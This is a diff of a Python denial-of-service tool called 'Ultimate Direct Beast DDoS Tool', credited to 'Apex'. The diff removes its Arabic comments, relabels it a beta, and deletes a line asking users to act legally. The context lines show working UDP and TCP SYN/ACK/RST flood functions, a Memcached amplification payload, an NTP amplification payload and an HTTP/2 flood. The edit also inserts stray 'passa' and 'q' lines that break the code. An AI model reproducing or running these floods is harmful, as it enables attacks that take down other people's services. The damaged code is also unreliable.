@@ -9,7 +9,6 @@ import struct
 from scapy.all import *
 import ssl
 
-# التحقق من صلاحيات root
 def check_root():
     if os.name == 'nt':
         try:
@@ -20,19 +19,16 @@ def check_root():
     else:
         return os.getuid() == 0
 
-# طباعة البانر المميز
 def print_banner():
     banner = r"""
 
-            ddos v3.0 -
+            ddos v.Beta -
             Developed by : Apex  - 777 |
     """
     print(banner)
 
-# ==================== هجمات DDoS الأساسية ====================
 
 def advanced_udp_flood(target_ip, target_port, packet_size, stop_event):
-    """هجوم UDP متطور مع تحسينات الأداء"""
     data = random._urandom(packet_size)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while not stop_event.is_set():
@@ -44,7 +40,6 @@ def advanced_udp_flood(target_ip, target_port, packet_size, stop_event):
     sock.close()
 
 def advanced_tcp_flood(target_ip, target_port, packet_size, stop_event, attack_type="SYN"):
-    """هجوم TCP مع خيارات متعددة (SYN, ACK, RST)"""
     data = random._urandom(packet_size)
     while not stop_event.is_set():
         try:
@@ -57,7 +52,7 @@ def advanced_tcp_flood(target_ip, target_port, packet_size, stop_event, attack_t
                 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                 s.sendto(data, (target_ip, target_port))
                 s.close()
-            else:  # TCP العادي
+            else: 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((target_ip, target_port))
                 s.send(data)
@@ -65,10 +60,8 @@ def advanced_tcp_flood(target_ip, target_port, packet_size, stop_event, attack_t
         except:
             pass
 
-# ==================== هجمات التضخيم ====================
 
 def memcached_amplification(target_ip, spoof_ip=None, stop_event=None):
-    """هجوم Memcached مع تضخيم يصل لـ50,000x"""
     payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
     while not stop_event.is_set():
         try:
@@ -84,7 +77,6 @@ def memcached_amplification(target_ip, spoof_ip=None, stop_event=None):
             time.sleep(0.1)
 
 def ntp_amplification(target_ip, stop_event):
-    """هجوم NTP amplification (حتى 556x تضخيم)"""
     payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
     while not stop_event.is_set():
         try:
@@ -92,12 +84,9 @@ def ntp_amplification(target_ip, stop_event):
             sock.sendto(payload, (target_ip, 123))
             sock.close()
         except:
-            pass
-
-# ==================== هجمات متقدمة ====================
+            passa
 
 def http2_flood(target_ip, target_port, stop_event):
-    """هجوم HTTP/2 متطور"""
     headers = {
         ':method': 'GET',
         ':path': '/',
@@ -117,24 +106,20 @@ def http2_flood(target_ip, target_port, stop_event):
         except:
             pass
 
-# ==================== أدوات مساعدة ====================
-
 def monitor_attack(stop_event, start_time):
-    """عرض إحصائيات الهجوم"""
+
     while not stop_event.is_set():
         elapsed = time.time() - start_time
         print(f"\r[+] Attack running for {int(elapsed)} seconds...", end='')
         time.sleep(1)
 
 def check_internet():
-    """فحص اتصال الإنترنت"""
     try:
         socket.create_connection(("8.8.8.8", 53), timeout=3)
         return True
     except:
         return False
-
-# ==================== الواجهة الرئيسية ====================
+q
 
 def main():
     if not check_root():
@@ -223,9 +208,9 @@ def main():
 
     print("\n[+] Attack finished successfully!")
     print("======================================")
-    print("Thank you for using Ultimate Direct Beast DDoS Tool")
-    print("Please use this tool responsibly and legally")
-    print("======================================")
+    print("Thank you for using Ultimate Direct Beast DDoS Tool By Apex")
+    print("THAT IS VERSION BETA")
+    print("================================")
 
 if __name__ == "__main__":
     main()
